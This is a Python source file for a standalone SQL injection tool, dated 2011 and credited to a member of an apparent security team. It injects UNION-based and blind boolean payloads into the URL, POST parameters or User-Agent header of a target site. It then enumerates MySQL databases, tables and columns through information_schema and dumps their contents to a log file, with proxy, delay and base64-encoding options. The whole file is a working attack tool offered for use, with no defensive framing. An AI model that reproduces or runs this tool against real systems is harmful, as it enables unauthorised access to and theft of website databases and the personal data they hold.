#!d:\python
#+----------------------------------------+
#| code by : tdxev                        |
#| website : tdxev.com                    |
#| team    : insecurity.ro                |
#| version : 16:49 PM , March 28, 2011    |
#| bugs & suggestions  : tdx_ev@yahoo.com |
#+ ---------------------------------------+



import urllib2                                                          # http requests
import time                                                             # for delay
import sys                                                              # for arguments
import os                                                               # run shell command to get number of rows, columns
import base64                                                           # to encode base64 string for parameters
import re                                                               # use to get text that need to be encoded
from urllib2  import URLError, HTTPError                                # for http errors
from optparse import OptionParser                                       # to parse options


# application settings
SQLiPlace       =   '{inject_here}'                                     # word that indicate the place (column) where to inject SQL statement
encode          =   {'start':'{encode}','end':'{/encode}'}              # text between this tag will be encode using the method specified by option encode
wordStart       =   's<><->|'                                           # indicate from where the result start
wordEnd         =   '|<-><>e'                                           # indicate where the result ends
wordSplit       =   '|<~>|'                                             # column data splitter | use as columns separator
logFile         =   'log'                                               # dump file for all extracted data
queryRepeat     =   5                                                   # number of repeats when query fail to return something
spaceChar       =   '/**/'                                              # spaces in the url will be replaced whit this variable
options         =   None                                                # keep the options that was been send to application
hex_chars       =   ['','0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'] # hexadecimal characters

#
# MYSQL START
#
SQL_db_nr       =   'SELECT COUNT(`schema_name`) FROM `information_schema`.`schemata`'
SQL_db_at       =   'SELECT `schema_name` FROM `information_schema`.`schemata` LIMIT %s,1'
SQL_tb_nr       =   'SELECT COUNT(DISTINCT `table_name`) FROM `information_schema`.`tables` WHERE `table_schema`=%s'
SQL_tb_at       =   'SELECT `table_name` FROM `information_schema`.`tables` WHERE `table_schema`=%s LIMIT %s,1'
SQL_cl_nr       =   'SELECT COUNT(DISTINCT `column_name`) FROM `information_schema`.`columns` WHERE `table_schema`=%s and `table_name`=%s'
SQL_cl_at       =   'SELECT `column_name` FROM `information_schema`.`COLUMNS` WHERE `table_schema`=%s and `table_name`=%s LIMIT %s,1'
SQL_dt_nr       =   'SELECT COUNT(0x2e) FROM `%s`.`%s`'                   # 0x2e = *
SQL_dt_at       =   'SELECT %s FROM `%s`.`%s` LIMIT %s,1'
SQL_dt_at_0     =   'SELECT concat_ws(%s,%s) FROM `%s`.`%s` LIMIT %s,1'

SQL_max_len     =   'SELECT MAX(LENGTH(%s)) FROM `%s`.`%s`'
SQL_if_null     =   'IFNULL(cast(`%s` as char),0x4e554c4c)'               # NULL Columns ifnull(`x`,'NULL') | Illegal mix of collations for operation 'UNION' unhex(hex(`x`)) or cast(`x` as char)

SQL_substr      =   'AND MID(hex(cast((%s) as char)),%s,1) = %s'
SQL_emptyString =   'MID(0x01,9,1)' # used to verify if SQL query return an empty string
#
# MYSQL END
#














# print to screen messages depending on the verbose type
class LOG:
    def toScreen(self,msgType,msg):
        global options
        if int(msgType) <= int(options.verbose):
            print ( msg )

    def toScreenResult(self,msgType,name_list):
        global options
        if int(msgType) <= int(options.verbose):
            # print to scree data that has been extracted
            if os.name == 'nt' :
                print( "" )
                print( 'LIST:'+','.join(name_list) )
            else :
                rows, columns = os.popen('stty size', 'r').read().split()
                print( '-'*int(columns) )
                print( 'LIST:'+','.join(name_list) )
                print( '-'*int(columns) )

# dump into file information
class toFile:

    def replace_all(self, text, dic):
        for i,j in dic.iteritems():
            text = text.replace(i,j)
        return text

    def writeBanner(self, info):
        f = open(logFile,'a')                        # open file for append
        f.write('+-'+ '-'*len(info) + '-+' +"\n")    # write banner
        f.write('| ' + info + ' |' +"\n")
        f.write('+-'+ '-'*len(info) + '-+' +"\n")
        f.close()                                    # close file

    def writeRowBanner(self, col_list,col_len):

        up_s  = ''
        mid_s = ''
        for i in range(len(col_list)):
            up_s  = up_s + '+-' +               '-'*(int(col_len[i])+2)
            mid_s = mid_s +'| ' + col_list[i] + ' '*((int(col_len[i])+2)-len(col_list[i]))

        f = open(logFile,'a')                        # open file for append
        f.write(up_s + '+' + "\n")    # write banner
        f.write(mid_s + '|' + "\n")   # write banner
        f.write(up_s + '+' + "\n")    # write banner
        f.close()                                    # close file

    def writeRowLine(self, col_values,col_len):
        mid_s = ''
        # list of char that will be replaced whit spaces
        reps = {'\n':' ', '\r':' ', '\t':' '}

        for i in range(len(col_values)):
            col_values[i] = self.replace_all(col_values[i],reps)
            mid_s = mid_s +'| ' + col_values[i] + ' '*((int(col_len[i])+2)-len(col_values[i]))

        f = open(logFile,'a')                        # open file for append
        f.write(mid_s + '|' + "\n")                  # write line
        f.close()                                    # close file

    def writeRowEnd(self, col_list,col_len):
        up_s  = ''
        for i in range(len(col_list)):
            up_s  = up_s + '+-' +               '-'*(int(col_len[i])+2)

        f = open(logFile,'a')                        # open file for append
        f.write(up_s + '+' + "\n")                   # write line
        f.close()                                    # close file

    def write(self, info):
        d = open(logFile,'a')                   # open file for append
        d.write(info +"\n")                     # write a line
        d.close()                               # close file

# class that is responsible for injection/requests/extract data
class ENGINE:

    # init class objects
    def __init__(self):
        global SQLiPlace
        global wordStart
        global wordEnd
        global hex_chars
        global SQL_emptyString
        global queryRepeat

        # request parameters
        self.useragent      = ''
        self.params         = ''
        self.method         = options.method
        self.url            = options.url

        self.queryRepeat    = queryRepeat
        self.qRetrayCount   =  0

        self.hex_chars      = hex_chars
        self.SQL_emptyString= SQL_emptyString
        self.place          = SQLiPlace
        self.wordStart      = wordStart
        self.wordEnd        = wordEnd
        self.last_request   = ''
        self.last_query     = ''

        #increase by one on each repetitive error
        self.sleepCount     = 0

    def setproxy(seslf,proxyaddr):
        # set proxy
        print ( proxyaddr )
        proxy   = urllib2.ProxyHandler({'http': proxyaddr})
        opener  = urllib2.build_opener(proxy)
        urllib2.install_opener(opener)

    # return url content
    def getPage(self):
        global options

        # replace spaces whit spaceChar
        url     = self.url.replace(' ', spaceChar);
        params  = self.params.replace(' ', spaceChar)

        # time delay between each request
        if options.delay :
            # strip options.delay string
            sleepTime = re.sub("\s[a-zA-Z]*", "", options.delay)
            time.sleep( float( sleepTime ) )

        # add headers
        headers = { 'User-Agent' : self.useragent }

        # make http request
        try:

            if self.method.upper() == 'GET':
                if params != '':
                    self.last_request = url + '?' + params
                else:
                    self.last_request = url
                LOG().toScreen(3,self.last_request)
                request_data = urllib2.Request(self.last_request, None, headers)
                page = urllib2.urlopen(request_data)
                LOG().toScreen(4,page.info())

            if self.method.upper() == 'POST':
                self.last_request = url + "\tPOST: " + params
                LOG().toScreen(3,url + "\tPOST: " + params)
                request_data = urllib2.Request(url, params, headers)
                page = urllib2.urlopen(request_data)
                LOG().toScreen(4,page.info())

        except HTTPError, e:
            # Display warning
            print ( 'The server couldn\'t fulfill the request.' )
            print ( 'Error code: ', e.code )
            print ( 'REQUEST :',self.last_request )
            print ( "Retry in "+ str(self.sleepCount) + " seconds..." )
            time.sleep(self.sleepCount)
            self.sleepCount += 1

            # Retry to connect
            textpage = self.getPage()
            self.sleepCount = 0
            return textpage

        except URLError, e:
            # Display warning
            print ( 'We failed to reach a server.' )
            print ( 'Reason: ', e.reason )
            print ( 'REQUEST :',self.last_request )
            print ( "Retry in "+ str(self.sleepCount) + " seconds..." )
            time.sleep(self.sleepCount)

            self.sleepCount += 1

            # Retry to connect
            textpage = self.getPage()
            self.sleepCount = 0
            return textpage


        textpage = page.read()
        LOG().toScreen(5,textpage)

        return textpage

    # return text encode in hexadecimal
    def toSQLHex(self, text):
        return "0x" + text.encode('hex_codec')

    # return text encoded in type options.encode
    def encode(self, text_data):
        if options.encode.upper() == "BASE64":
            groups = re.search( encode['start'] + '.*' + encode['end'], text_data )
            if groups :
                text_to_replace = groups.group(0)
                text_to_encode  = text_to_replace
                text_to_encode  = text_to_encode.replace(encode['start'], '')
                text_to_encode  = text_to_encode.replace(encode['end'], '')

                text_data = text_data.replace(text_to_replace, base64.b64encode(text_to_encode))
            else :
                print ( "ERROR : Encode tags has not been found.\t Use " + encode['start'] + " to start and " +encode['end'] + " to close." )
        return  text_data

    # search each parameter to see where to make the injection
    def inject_query(self, query):
        # URL injection
        if options.url.find(self.place) != -1:
            self.url = options.url.replace(self.place,  query)
            if options.encode != 'NOENCODE' :
                self.url = self.encode(self.url)

        # GET / POST - parameters injection
        if options.params.find(self.place) != -1:
            self.params =  options.params.replace(self.place,  query)
            if options.encode != 'NOENCODE' :
                self.params = self.encode(self.params)

        # USER AGENT - injection
        if options.agent.find(self.place) != -1:
            self.useragent = options.agent.replace(self.place,  query)
            if options.encode != 'NOENCODE' :
                self.useragent = self.encode(self.useragent)
        return ''

    # return result of SQL query
    def sql_result(self,sql_query):
        self.last_query = sql_query                                     # remember the last query executed
        LOG().toScreen(2,'QUERY: '+sql_query)                           # send query to screen
        data = ''

        # INJECTION TYPE UNION
        if options.injection_method.upper() == "UNION" :
            params  = self.inject_query('concat(' + self.toSQLHex(self.wordStart) + ',(' + sql_query + ' ),' + self.toSQLHex(self.wordEnd) + ')')
            page    = self.getPage()  # get page content
            data    = self.extract_data(page)                             # extract sql query result from the page

            # if query fail to return a result retry (5 time default) before skip this query
            if data == False :
                #queryRepeat
                self.qRetrayCount += 1
                if self.qRetrayCount < self.queryRepeat :
                    data = self.sql_result( sql_query );

        # INJECTION TYPE BLIND
        elif options.injection_method.upper() == "BLIND" :
            if not options.string :
                print ( "ERROR : Unknown string error, check \"--string\" option" )
                data = False
            else:
                data = self.extarct_data_blind(sql_query)
        else :
            print ( "ERROR : Unknown injection method, check: \"--injection-method\"" )

        # reset counter for query faild
        self.qRetrayCount = 0
        return data

    # extract sql query result from the page using INBAND
    def extract_data(self, page):
        s = page.find(self.wordStart)
        e = page.find(self.wordEnd)

        # if one of two words not appear in the page something goes wrong | ERROR
        if s == -1 or e == -1 :
            toFile().writeBanner('[ERROR :  Keyword not found ] [Query: ' + self.last_query + ']')
            print ( "ERROR : Key words not found in the page!"  )
            return False

        data = page[s + len(self.wordStart) :e]
        LOG().toScreen(1,'EXTRACTED DATA: ' + data)
        return data

    # extract sql query result from the request using BLIND
    def extarct_data_blind(self,sql_query):
        hex_len = ''
        pos = 0
        bchar = ''
        while bchar != -1 :
            pos += 1
            bchar = self.extract_data_blind_charAt(sql_query,pos)
            if bchar != -1:
                hex_len += bchar
                if len(hex_len) % 2 == 0 :
                    g = hex_len[len(hex_len)-2:].decode("hex_codec")
                    sys.stdout.write('\x1b[32m')
                    sys.stdout.write(g)
                    sys.stdout.flush()
                    sys.stdout.write('\x1b[m')

        if hex_len != '':
            data = hex_len.decode("hex_codec")
            sys.stdout.write("\n")
            sys.stdout.flush()
            LOG().toScreen(1,'EXTRACTED DATA: ' + data)
            return data
        else:
            print ( "ERROR : Blind injection has fail." )
            return False

    # get  one character from the SQL result
    def extract_data_blind_charAt(self,sql_query,pos):
        for c in self.hex_chars :
            if c != '' :
                query = SQL_substr % ( sql_query,str(pos), self.toSQLHex(c) )
            else :
                query = SQL_substr % ( sql_query,str(pos), self.SQL_emptyString )

            params  = self.inject_query( query )
            page    = self.getPage()  # get page content


            if page.find( options.string ) != -1:
                if c == '':
                    return -1
                return c
        return -1




# DATABASES
class DATABASES:

    # init class objects
    def __init__(self):
        global options

    # extract number of data bases
    def get_nr(self):
        query = SQL_db_nr
        rowsNr = ENGINE().sql_result( query )
        return rowsNr

    # extract data base name at position pos
    def get_at(self,pos):
        query = SQL_db_at % (pos)
        return ENGINE().sql_result( query )
    # extract all data bases and dump in log file
    def get_all(self):
        LOG().toScreen(1,'Extract the number of rows...')
        rowsNr = self.get_nr()
        if rowsNr==False:
            print ( "ERROR : Can not extract number of rows." )
            return False

        toFile().writeBanner('[DATABASES] [' + rowsNr + ']')
        name_list = []
        LOG().toScreen(1,'Extract data from columns...')
        for nr in range( int(rowsNr) ):
            name = self.get_at(nr)
            name_list.append(name)
            toFile().write('[' + str(nr).zfill(len(rowsNr)) + '] ' + name)
        toFile().write('LIST :' + ','.join(name_list) )
        toFile().write("")
        LOG().toScreenResult(1,name_list)
        return name_list

# TABLES
class TABLES:
    # init class objects
    def __init__(self):
        global options

    # extract number of tables from selected database
    def get_nr(self, db_name):
        query = SQL_tb_nr % (ENGINE().toSQLHex(db_name))
        rowsNr = ENGINE().sql_result( query )
        return rowsNr

    # extract table name at position pos
    def get_at(self, db_name, pos):
        query = SQL_tb_at % (ENGINE().toSQLHex(db_name), pos)
        return ENGINE().sql_result( query )

    # extract all tables from database and dump in log file
    def get_all(self,db_name):
        LOG().toScreen(1,'Extract the number of rows...')
        rowsNr = self.get_nr(db_name)
        if rowsNr==False:
            print ( "ERROR : Can not extract number of rows." )
            return False

        toFile().writeBanner('[TABLES] `' + db_name + '`  [' + rowsNr + ']')
        name_list = []
        LOG().toScreen(1,'Extract data from columns...')
        for nr in range( int(rowsNr) ):
            name = self.get_at(db_name,nr)
            name_list.append(name)
            toFile().write('[' + str(nr).zfill(len(rowsNr)) + '] ' + name)
        toFile().write('LIST :' + ','.join(name_list) )
        toFile().write("")
        LOG().toScreenResult(1,name_list)
        return name_list

# COLUMNS
class COLUMNS:
    # init class objects
    def __init__(self):
        global options

    # extract number of columns from selected table
    def get_nr(self, db_name, tb_name):
        query = SQL_cl_nr % (ENGINE().toSQLHex(db_name),ENGINE().toSQLHex(tb_name))
        rowsNr = ENGINE().sql_result( query )
        return rowsNr


    # extract column name at position pos
    def get_at(self, db_name, tb_name, pos):
        query = SQL_cl_at % (ENGINE().toSQLHex(db_name), ENGINE().toSQLHex(tb_name), pos)
        return ENGINE().sql_result( query )

    # extract all tables from database and dump in log file
    def get_all(self, db_name, tb_name):
        LOG().toScreen(1,'Extract the number of rows...')
        rowsNr = self.get_nr(db_name, tb_name)
        if rowsNr==False:
            print ( "ERROR : Can not extract number of rows." )
            return False

        toFile().writeBanner('[COLUMNS] `' + db_name + '`.`' + tb_name + '`  [' + str(rowsNr) + ']')
        name_list = []

        LOG().toScreen(1,'Extract data from columns...')
        for nr in range( int(rowsNr) ):
            name = self.get_at(db_name, tb_name, nr)
            if name != False :
                name_list.append(name)
                toFile().write('[' + str(nr).zfill(len(rowsNr)) + '] ' + name)
        toFile().write('LIST :' + ','.join(name_list) )
        toFile().write("")

        LOG().toScreenResult(1,name_list)

        return name_list

# DATA
class DATA:
    # init class objects
    def __init__(self):
        global options

    # extract max length of column content | need only for visual design
    def get_maxLen(self, db_name, tb_name, cl_name):
        query = SQL_max_len % (cl_name,db_name,tb_name)
        return ENGINE().sql_result( query )

    # extract number of rows from table
    def get_nr(self, db_name, tb_name):
        query = SQL_dt_nr % (db_name,tb_name)
        rowsNr = ENGINE().sql_result( query )
        return rowsNr

    # extract value from specified column
    def get_at(self, db_name, tb_name, cl_name, pos):
        query = SQL_dt_at % (cl_name, db_name, tb_name, pos)
        return ENGINE().sql_result( query )

    # mysql concat_ws
    def get_at_ws(self, db_name, tb_name, cl_list, pos):
        query = SQL_dt_at_0 % (ENGINE().toSQLHex(wordSplit), cl_list, db_name, tb_name, pos)
        return ENGINE().sql_result( query )

    # extract columns values from specified row and return array
    def get_row(self, db_name, tb_name, cl_list, pos):
        cl_list_ifnull_array = []
        cl_list_ifnull       = ''
        # add IFNULL statement for each column
        for col in cl_list.split(','):
            cl_list_ifnull = cl_list_ifnull + SQL_if_null % ( col ) + ','
            cl_list_ifnull_array.append(SQL_if_null % ( col ))
        cl_list_ifnull = cl_list_ifnull[:-1]

        if options.injection_method.upper() != "BLIND" :
            # try concat_ws syntax
            data = self.get_at_ws(db_name, tb_name, cl_list_ifnull, pos)
            if data != False:
                return data.split(wordSplit)

            print ( "Some error has apper when using concat_ws try to extract data column by column" )

        # get data column by column
        col_value = []
        for col in cl_list_ifnull_array:
            data = self.get_at(db_name, tb_name, col, pos)
            if data != False:
                col_value.append(data)
            else:
                print ( "Some error has apper when trying to extract data from '", col,"'" )

        return col_value

    # extract all data from selected columns
    def get_all(self, db_name, tb_name, cl_list):
        # if column list is empty exit
        if cl_list == '':
            return 0

        # get number of rows that will be extracted
        rowsNr = self.get_nr(db_name, tb_name)
        if rowsNr==False:
            print ( "ERROR : Can not extract number of rows." )
            return False

        if int(rowsNr) < 1 :
            toFile().writeBanner('[DATA] `' + db_name + '`.`' + tb_name + '`  [' + str(rowsNr) + ']')
            return 0



        # try to extract max length of each column content | need only for visual design
        #-------------------------------------------------------------[ GET LENGTH START
        columns_list = cl_list.split(',')
        columns_len  = []

        for col in columns_list:
            col_len =  self.get_maxLen(db_name, tb_name, SQL_if_null % ( col ) )
            if int(col_len) < len(col) :
                col_len = len(col)
            columns_len.append(col_len)
        #-------------------------------------------------------------[ GET LENGTH END


        toFile().writeBanner('[DATA] `' + db_name + '`.`' + tb_name + '`  [' + str(rowsNr) + ']')
        toFile().writeRowBanner(columns_list,columns_len)


        # tray to extract data using CONCAT_WS
        for nr in range( int(rowsNr) ):
            name = self.get_row(db_name,tb_name,cl_list,nr)
            toFile().writeRowLine(name,columns_len)

        toFile().writeRowEnd(name,columns_len)
        toFile().write("")

# dump entire table
def dump_table(db_name,tb_name) :
    columns_list = COLUMNS().get_all(db_name,tb_name)
    if not options.get_structure:
        DATA().get_all(db_name, tb_name, ','.join(columns_list))

# dump entire database
def dump_database(db_name) :
    tables_list = TABLES().get_all(db_name)
    for tb_name in tables_list :
        dump_table(db_name,tb_name)

# dump all databases
def dump_databases() :
    database_list = DATABASES().get_all()
    for db_name in database_list :
        tables_list = TABLES().get_all(db_name)
        for tb_name in tables_list :
            dump_table(db_name,tb_name)

# user custom query injection
def custom_query():
    data = ENGINE().sql_result( options.custom_sql_query )
    if data :
        toFile().writeBanner('[CUSTOM QUERY]  [' + str(options.custom_sql_query) + ']')
        toFile().writeBanner('[QUERY RESULT]  [' + str(data) + ']')


def main(argv):
    global options
    usage = "%s --help        for more options" %  sys.argv[0]
    parser = OptionParser(usage=usage)

    parser.add_option("-u", "--url", dest="url",
                    help="URL where the injection will be made")

    parser.add_option("-p", "--params", dest="params",default='',
                    help="Parameters that will be send to the page")

    parser.add_option("-m", "--method", dest="method",default='GET',
                    help="Method that will be use to send params GET | POST (Default GET)")

    parser.add_option("--user-agent", dest="agent",default='',
                    help="Custom user-agent (Default empty string)")

    parser.add_option("--proxy", dest="proxy",default = None,
                    help="Set a http proxy (default = None), ex --proxy \"109.123.100.55:3128\"")

    parser.add_option("--delay", dest="delay",default = 0,
                    help="Aplay time delay between http requests (Default 0 seconds)")

    parser.add_option("--injection-method", dest="injection_method",default='UNION',
                    help="Method that will be use to extract data UNION | BLIND (Default UNION)")

    parser.add_option("--string", dest="string",
                    help="String to match in page when the query is valid")

    parser.add_option("--encode", dest="encode",default='NOENCODE',
                    help="Encode value in the parameter that is injected NOENCODE | BASE64 (Default NOENCODE)")

    parser.add_option("--dbs", dest="get_dbs",action="store_true",
                    help="Extract all databases")

    parser.add_option("--tables", dest="get_tbs",action="store_true",
                    help="Extract all tables from database specified by -D")

    parser.add_option("--columns", dest="get_cols",action="store_true",
                    help="Extract all columns from tables specified by -T")

    parser.add_option("--dump", dest="get_data",action="store_true",
                    help="Dump data from database, table, columns")

    parser.add_option("--structure", dest="get_structure", action="store_true",
                    help="Specify to extract only structure of selected table or database")

    parser.add_option("-D", dest="db_name",
                    help="Specify which database to use")

    parser.add_option("-T", dest="tb_name",
                    help="Specify which table to use")

    parser.add_option("-C", dest="columns_name",
                    help="Specify which columns to use ex. ( -C 'id,user,email')")

    parser.add_option("--query", dest="custom_sql_query",
                    help="Specify a custom query to execute ")

    parser.add_option("-v", dest="verbose",default=1,
                    help="Verbose mode (delault 1)")

    options, args = parser.parse_args()

    if not options.url :
        parser.error("you must enter -u;--url and -p; --params ")

    # exec user commands
    if options.proxy :
        ENGINE().setproxy(options.proxy)

    if options.get_dbs:
        DATABASES().get_all()

    if options.get_tbs:
        if not options.db_name :
            parser.error("You must specify what database to use to extract tables")
        TABLES().get_all(options.db_name)

    if options.get_cols:
        if not options.db_name :
            parser.error("You must specify what database to use to extract columns")
        if not options.tb_name :
            parser.error("You must specify what table to use to extract columns")
        COLUMNS().get_all(options.db_name,options.tb_name)

    if options.get_data:
        if not options.db_name :
            print ( "You can specify from what database will extract data by using : -D database_name" )
            ans = raw_input("You want to extract all data from all databases`? (Y/N) :")
            if ans.lower() == 'y' :
                dump_databases()
                sys.exit(0)
            else :
                sys.exit(0)

        if not options.tb_name :
            print ( "You can specify from what table will extract data by using : -T table_name" )
            ans = raw_input( "You want to extract all data from data base `" + options.db_name +"`? (Y/N) :" )
            if ans.lower() == 'y' :
                dump_database(options.db_name)
                sys.exit(0)
            else :
                sys.exit(0)


        if not options.columns_name :
            print ( "You can specify from what columns will extract data by using : -C column_name,column_name" )
            ans = raw_input("You want to extract all data from table `" + options.tb_name +"`? (Y/N) :")
            if ans.lower() == 'y' :
                dump_table(options.db_name, options.tb_name)
                sys.exit(0)
            else :
                sys.exit(0)
        else:
            # if has been from what column will extract data
            DATA().get_all(options.db_name,options.tb_name,options.columns_name)

    if options.custom_sql_query:
        custom_query()


if __name__ == "__main__":
    main(sys.argv[1:])